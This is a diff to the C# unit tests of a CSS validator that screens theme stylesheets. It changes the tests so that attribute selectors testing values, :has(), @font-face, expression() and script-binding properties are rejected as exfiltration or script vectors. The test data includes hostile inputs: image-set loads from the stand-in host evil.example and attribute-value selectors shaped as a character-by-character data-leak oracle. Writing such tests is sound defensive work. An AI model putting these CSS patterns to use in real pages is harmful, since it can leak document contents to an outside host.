@@ -311,7 +311,6 @@ public class CssValidatorTests
         // path from the first error to a working file.
         Accept(".x { background: url(data:image/gif;base64,R0lGODlh); }");
         Accept(".x { background: url(data:image/gif;base64,R0lGODlh) }");
-        Accept("@font-face { src: url(data:font/woff2;base64,d09GMg) format('woff2'); }");
         // A brace inside one must not be counted either.
         Accept(".x { background: url(data:text/plain,}); color: red; }");
     }
@@ -503,7 +502,6 @@ public class CssValidatorTests
         Accept(".x::before { content: \"12:30\"; }");
         Accept(":root { --doc: \"note: see the readme\"; }");
         Accept(".x { font-family: \"Foo:Bar\", sans-serif; }");
-        Accept("[title=\"a:b\"] { color: red; }");
     }
 
     [Fact]
@@ -671,18 +669,38 @@ public class CssValidatorTests
     }
 
     [Fact]
-    public void AnAttributeSelectorMayMentionAUrl()
+    public void AnAttributeSelectorMayNotTestAValue()
     {
-        // The commonest string containing `//` in a documentation theme, and it is
-        // matched against the page rather than fetched. Nothing about the string
-        // distinguishes it — only where it sits.
-        Accept("a[href^=\"https://\"]::after { content: \" x\"; }");
-        Accept("a[href^=\"//\"] { color: red; }");
-        Accept("a[href^=\"http://\"] { color: orange; }");
-        // ...and leaving the brackets restores the rule.
-        Assert.Contains("outside the app", Reject(
-            "a[href^=\"https://\"] { background-image: image-set(\"https://evil.example/a.png\" 1x); }").Message);
+        // This test used to assert the opposite, and the reversal is the point.
+        //
+        // `a[href^=\"https://\"]` is a reasonable thing for a documentation theme to
+        // write and is harmless in itself — but it is also the exact shape of the
+        // exfiltration oracle, and nothing downstream can tell the two apart: each
+        // match fires an image request, and images have to stay allowed because
+        // documents legitimately reference them. So the comparison goes.
+        //
+        // Over-rejecting, deliberately. The cost is a message; the cost of the other
+        // answer is a stylesheet that reads a document out one character at a time.
+        foreach (var css in new[]
+        {
+            "a[href^=\"https://\"]::after { content: \" x\"; }",
+            "span[data-value^=\"a\"] { background: red; }",
+            "input[value$=\"9\"] { color: red; }",
+            "div[class*=\"secret\"] { color: red; }",
+            "p[lang|=\"en\"] { color: red; }",
+            "p[rel~=\"tag\"] { color: red; }",
+            "a[title=\"x\"] { color: red; }",
+        })
+        {
+            Assert.Contains("tests a VALUE", Reject(css).Message);
+        }
     }
+
+    [Fact]
+    public void AnAttributeSelectorMayStillTestPresence()
+        // Still allowed, because it reads nothing back: whether an attribute EXISTS
+        // is structure, not content.
+        => Accept("details[open] > summary { color: red; }\ninput[disabled] { color: gray; }");
 
     [Fact]
     public void HexEscapesStopAtSixDigits()
@@ -794,6 +812,33 @@ public class CssValidatorTests
         // single-character trim leaves two of them hiding a scheme.
         => Assert.Contains("outside the app", Reject(
             ".b { background-image: image-set(\"\u0001\u0002https://evil.example/a.png\" 1x); }").Message);
+
+    [Fact]
+    public void TheSafetyScanRefusesWhatAThemeDoesNotNeed()
+    {
+        // Over-broad on purpose. Each of these is refused whether or not the spelling
+        // in front of us is exploitable, because the cost of refusing a construct a
+        // palette does not need is a message, and the cost of allowing one it can
+        // misuse is a surface that four review rounds could not close by cleverness.
+        Assert.Contains(":has()", Reject("div:has(> img) { color: red; }").Message);
+        Assert.Contains("@font-face", Reject("@font-face { font-family: X; }").Message);
+        Assert.Contains("run script", Reject(".x { width: expression(alert(1)); }").Message);
+        Assert.Contains("attach script", Reject(".x { -moz-binding: url(x.xml#y); }").Message);
+        Assert.Contains("attach script", Reject(".x { behavior: url(x.htc); }").Message);
+    }
+
+    [Fact]
+    public void TheSafetyScanLeavesAnOrdinaryPaletteAlone()
+        // The other half of over-rejecting: it has to not reject the thing people
+        // actually write. A palette is variables and plain selectors.
+        => Accept("""
+        :root { --mdm-page-bg: #ffffff; --mdm-text: #1a1a1a; }
+        .mdm-prosemirror blockquote { background: #f2f7fb; border-left: 6px solid #569ad4; }
+        .mdm-prosemirror h1, .mdm-prosemirror h2 { color: #4682b4; }
+        .mdm-prosemirror a:hover { color: #2f5f87; }
+        details[open] { color: red; }
+        @media print { :root { --mdm-text: #000; } }
+        """);
 
     // ---- the message itself ----
 
